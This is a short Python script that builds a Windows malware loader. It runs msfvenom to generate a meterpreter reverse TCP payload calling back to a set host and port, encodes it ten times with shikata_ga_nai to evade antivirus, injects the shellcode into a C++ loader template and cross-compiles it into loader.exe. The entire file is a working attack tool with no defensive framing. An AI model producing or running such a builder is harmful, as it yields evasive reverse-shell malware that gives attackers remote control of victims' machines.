from insert_code import insert_payload
import subprocess as sb

LHOST = '192.168.100.1'

LPORT = '6942'

RAW_CODE_FILE = 'reverse_tcp_raw.txt'

LOADER_TEMPLATE = 'payload_deployer.cpp.template'

GEN_CODE = 'payload_deployer_gen.cpp'

LOADER_EXE = 'loader.exe'

print('Creating payload using msfvenom...')

payload_creator = sb.Popen(["msfvenom",
                            "-p",
                            "windows/x64/meterpreter_reverse_tcp",
                            "-e",
                            "x86/shikata_ga_nai",
                            "-i", "10",
                            f'LHOST={LHOST}',
                            f'LPORT={LPORT}',
                            "-f",
                            "raw",
                            "-o",
                            RAW_CODE_FILE])

if payload_creator.wait() != 0:
    print('Error creating MSF payload')
    exit(-1)

print('Inserting payload into loader...')

insert_payload(RAW_CODE_FILE, LOADER_TEMPLATE, GEN_CODE)

print('Compiling generated code...')

compiler = sb.Popen(["x86_64-w64-mingw32-g++", GEN_CODE, '-o', LOADER_EXE])

if compiler.wait() != 0:
    print('Error compiling generated code!')
    exit(-1)

print('Loader generated at', LOADER_EXE)
